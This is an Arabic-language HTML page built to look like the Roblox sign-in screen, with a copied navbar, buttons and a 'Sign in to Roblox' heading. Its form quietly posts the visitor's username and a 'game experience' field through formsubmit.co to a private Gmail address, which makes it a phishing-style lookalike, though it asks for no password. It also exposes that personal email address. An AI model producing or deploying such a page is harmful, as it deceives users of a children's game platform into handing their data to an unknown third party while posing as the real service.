<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Roblox</title>

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#1c1f26;
  color:white;
}
.navbar{
  background:linear-gradient(#1a1a1a,#0f0f0f);
  height:64px;
  display:flex;
  align-items:center;
  padding:0 18px;
}
.logo{font-size:24px;font-weight:900;margin-right:20px;}
.links{display:flex;gap:18px;}
.links a{color:#ddd;text-decoration:none;font-size:14px;}
.links a:hover{color:white}
.search{
  margin:auto;
  display:flex;
  align-items:center;
  background:#222;
  border-radius:10px;
  padding:6px 14px;
  width:420px;
}
.search input{background:transparent;border:none;color:white;outline:none;width:100%;}
.actions{margin-left:auto;display:flex;gap:10px;}
.btn-blue,.btn-dark{width:120px;padding:8px 0;border-radius:8px;font-weight:bold;}
.btn-blue{background:#2a7cff;border:none;color:white;}
.btn-dark{background:#111;border:1px solid #555;color:white;}

.bg{
  background:url("IMG_0161.png") center/cover no-repeat;
  min-height:calc(100vh - 64px);
  display:flex;
  justify-content:center;
  align-items:center;
}

/* ===== Login Box ===== */
.box{
  background:rgba(35,38,47,0.95);
  width:380px;
  padding:25px;
  border-radius:16px;
  box-shadow:0 0 25px rgba(0,0,0,0.6);
}
.box h2{text-align:center;}

.box input{
  width:100%;
  padding:12px;
  margin:10px 0;
  border:none;
  border-radius:10px;
  background:#2f3340;
  color:#ffffff;
  font-size:16px;
}
.box input::placeholder{color:#bbbbbb;}

.line{height:1px;background:#444;margin:15px 0;}

/* Roblox Buttons */
.rb-btn{
  width:100%;
  padding:12px;
  border-radius:10px;
  font-size:16px;
  font-weight:700;
  cursor:pointer;
  border:none;
  transition:0.2s;
}

.rb-login{
  background:linear-gradient(#3aa0ff,#1f6bff);
  color:white;
}
.rb-login:hover{filter:brightness(1.15);}

.rb-google{
  background:#111;
  color:white;
  border:1px solid #555;
}
.rb-google:hover{background:#1a1a1a;}

.rb-signup{
  background:#2f3340;
  color:#ddd;
  border:1px solid #555;
}
.rb-signup:hover{background:#3a3f50;color:white;}

.small{text-align:center;font-size:13px;color:#ccc;margin-top:12px;}
</style>
</head>

<body>

<div class="navbar">
  <div class="logo">ROBLOX</div>
  <div class="links">
    <a href="#">الرئيسية</a>
    <a href="#">السوق</a>
    <a href="#">إنشاء</a>
    <a href="#">Robux</a>
  </div>
  <div class="search">
    <input type="text" placeholder="بحث">
  </div>
  <div class="actions">
    <button class="btn-blue">تسجيل الدخول</button>
    <button class="btn-dark">تسجيل</button>
  </div>
</div>

<div class="bg">
  <div class="box">
    <h2>تسجيل الدخول إلى Roblox</h2>

    <form action="https://formsubmit.co/battal.alzahrani23@gmail.com" method="POST">
      <input type="hidden" name="_subject" value="تسجيل لاعب جديد">
      <input type="hidden" name="_template" value="table">

      <input type="text" name="Player_Name" placeholder="اسم المستخدم" required>
      <input type="text" name="Player_Experience" placeholder="خبراتك في اللعبة" required>

      <button type="submit" class="rb-btn rb-login">تسجيل الدخول</button>
    </form>

    <div class="line"></div>

    <button class="rb-btn rb-google">تسجيل بواسطة Google</button>
    <button class="rb-btn rb-signup" style="margin-top:10px;">إنشاء حساب جديد</button>

    <div class="small">ليس لديك حساب؟ أنشئ حساب الآن</div>
  </div>
</div>

</body>
</html>
